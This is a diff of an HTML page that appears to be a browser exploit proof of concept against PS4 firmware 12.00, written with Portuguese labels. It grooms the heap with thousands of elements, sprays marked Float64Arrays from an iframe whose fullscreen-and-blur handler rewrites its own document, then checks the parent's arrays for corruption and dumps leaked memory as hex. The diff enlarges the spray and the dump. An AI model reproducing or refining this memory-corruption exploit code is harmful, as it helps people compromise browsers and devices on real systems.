@@ -2,20 +2,21 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Dirty Heap - Leandro</title>
+    <title>PS4 Heap Grooming - Leandro</title>
 </head>
 <body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">
 
-    <h1>PS4 12.00 - Dirty Heap (Sujando os Zeros)</h1>
+    <h1>PS4 12.00 - Heap Grooming</h1>
     <p>Status: <span id="status-pai" style="font-weight:bold;">Aguardando...</span></p>
 
-    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos (Pai)</button>
-    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe (Dirty Spray)</button>
-    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar (0-63)</button>
+    <button onclick="groomHeap()" style="padding: 12px; background-color: #ffeb3b;">0. Sujar RAM (Grooming)</button>
+    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos</button>
+    <button onclick="setupIframe()" style="padding: 12px;">2. Iframe (Fast Spray)</button>
+    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar (Dump 0-127)</button>
 
     <hr>
-    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 11px;"></div>
-
+    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 10px; max-height: 400px; overflow-y: scroll;"></div>
+    <div id="grooming-area" style="display:none;"></div>
     <div id="frame-container" style="margin-top: 20px;"></div>
 
     <script>
@@ -24,57 +25,52 @@
         const statusPai = document.getElementById('status-pai');
         const leakOutput = document.getElementById('leak-output');
 
+        // PASSO 0: Cria milhares de elementos pequenos para fragmentar a memória
+        function groomHeap() {
+            const area = document.getElementById('grooming-area');
+            for(let i = 0; i < 2000; i++) {
+                let d = document.createElement('div');
+                d.title = "Grooming" + i;
+                area.appendChild(d);
+            }
+            statusPai.innerText = "RAM Fragmentada. Siga para o Passo 1.";
+            statusPai.style.color = "orange";
+        }
+
         function prepareObjects() {
             controllers = [];
-            // Usaremos Float64Array(64) para uma varredura ainda mais profunda
             for(let i = 0; i < 5000; i++) {
-                let arr = new Float64Array(64); 
+                // Aumentamos para 128 offsets (1KB por objeto)
+                let arr = new Float64Array(128); 
                 arr[0] = i; 
                 controllers.push(arr);
             }
-            statusPai.innerText = "5000 Objetos (Tamanho 64) prontos.";
+            statusPai.innerText = "5000 Objetos (1KB) prontos.";
             statusPai.style.color = "blue";
-            leakOutput.style.display = "none";
         }
 
         function setupIframe() {
             const container = document.getElementById('frame-container');
-            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
-            
+            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:100px; border:1px solid red;"></iframe>';
             const frame = document.getElementById('pocFrame');
             const fDoc = frame.contentWindow.document;
 
             fDoc.open();
             fDoc.write(`
-                <html>
-                <body>
-                    <button onclick="startPoC()" style="padding:10px;">START (FS + OPTIONS)</button>
-                    <script>
-                        window.startPoC = function() {
-                            if (document.documentElement.webkitRequestFullscreen) 
-                                document.documentElement.webkitRequestFullscreen();
-                            
-                            window.onblur = function() {
-                                // DIRTY SPRAY
-                                // Criamos strings e arrays para deixar "rastro" na RAM
-                                let garbage = [];
-                                for(let i = 0; i < 5000; i++) {
-                                    // Strings longas costumam deixar ponteiros estáveis
-                                    garbage.push("A".repeat(128) + i); 
-                                    let p = new Float64Array(64).fill(${PATTERN});
-                                    garbage.push(p);
-                                }
-
-                                setTimeout(() => {
-                                    document.open();
-                                    document.write('<h1>FINALIZADO</h1>');
-                                    document.close();
-                                }, 1000);
-                            };
+                <html><body><button onclick="st()">START FS + OPTIONS</button>
+                <script>
+                    function st() {
+                        document.documentElement.webkitRequestFullscreen();
+                        window.onblur = function() {
+                            let s = [];
+                            for(let i = 0; i < 10000; i++) {
+                                let p = new Float64Array(128).fill(${PATTERN});
+                                s.push(p);
+                            }
+                            document.open(); document.write('<h1>OK</h1>'); document.close();
                         };
-                    <\/script>
-                </body>
-                </html>
+                    }
+                <\/script></body></html>
             `);
             fDoc.close();
         }
@@ -92,11 +88,11 @@
             }
 
             if (corrupted) {
-                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: Corrupção no ID: " + corruptedIndex + "</span>";
+                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: ID: " + corruptedIndex + "</span>";
                 leakOutput.style.display = "block";
-                leakOutput.innerHTML = "<b>[ DIRTY DUMP 0-63 ]</b><br><br>";
+                leakOutput.innerHTML = "<b>[ DEEP DUMP 0-127 ]</b><br>";
 
-                for(let i = 0; i < 64; i++) {
+                for(let i = 0; i < 128; i++) {
                     const val = corrupted[i];
                     const buf = new ArrayBuffer(8);
                     new Float64Array(buf)[0] = val;
@@ -109,7 +105,7 @@
                     leakOutput.innerHTML += "O[" + i + "]: <span style='" + style + "'>0x" + hex + "</span> | " + br;
                 }
             } else {
-                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: Corrupção não detectada.</span>";
+                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA.</span>";
             }
         }
     </script>
